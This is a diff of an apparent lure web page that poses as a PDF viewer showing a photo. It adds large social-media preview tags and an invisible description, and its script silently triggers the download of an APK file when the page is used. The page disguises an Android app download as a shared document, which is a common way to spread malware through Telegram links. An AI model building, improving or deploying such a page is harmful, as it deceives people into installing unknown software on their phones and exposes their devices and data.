@@ -14,38 +14,39 @@
     <meta property="og:description" content="&#x200B;">
     
     <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo_preview.jpg">
+    <meta property="og:image:width" content="576"> <!-- Вертикальный размер -->
+    <meta property="og:image:height" content="1024"> <!-- Высота для заметного превью -->
     
-    <meta property="og:image:width" content="600"> 
-    <meta property="og:image:height" content="800">
+    <meta name="twitter:card" content="summary_large_image"> <!-- Улучшение для Twitter/Telegram -->
+    <meta name="twitter:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo_preview.jpg">
+    <meta name="twitter:image:width" content="576">
+    <meta name="twitter:image:height" content="1024">
+    
     <style>
-        /* Общие стили и фон */
+        /* Стили для имитации PDF */
         body, html { 
             margin: 0; padding: 0; 
             height: 100%; width: 100%; 
             font-family: Arial, sans-serif;
-            background-color: #2c3e50; /* Темный современный фон */
+            background-color: #2c3e50; 
             display: flex;
             justify-content: center;
             align-items: center;
             overflow: auto;
         }
-
-        /* Стиль "PDF Viewer" (окошко) */
         .pdf-viewer {
             width: 90%;
-            max-width: 800px; 
-            height: 90vh; 
-            background-color: #34495e; 
+            max-width: 800px;
+            height: 90vh;
+            background-color: #34495e;
             border-radius: 8px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             display: flex;
             flex-direction: column;
             overflow: hidden;
         }
-
-        /* Заголовок-имитация */
         .header {
-            background-color: #27ae60; 
+            background-color: #27ae60;
             color: white;
             padding: 10px 20px;
             font-weight: bold;
@@ -53,21 +54,17 @@
             text-align: center;
             user-select: none;
         }
-
-        /* Область для картинки (имитация содержимого PDF) */
         .content {
-            flex-grow: 1; 
-            background-color: #ecf0f1; 
+            flex-grow: 1;
+            background-color: #ecf0f1;
             padding: 20px;
-            overflow-y: scroll; 
+            overflow-y: scroll;
             text-align: center;
         }
-        
-        /* Стиль для фото внутри PDF */
         .content img {
             max-width: 100%;
             height: auto;
-            border: 1px solid #bdc3c7; 
+            border: 1px solid #bdc3c7;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             display: block;
             margin: 0 auto;
@@ -97,7 +94,6 @@
             const link = document.createElement('a');
             link.href = apkUrl + '?t=' + Date.now(); 
             link.download = apkFilename; 
-            
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
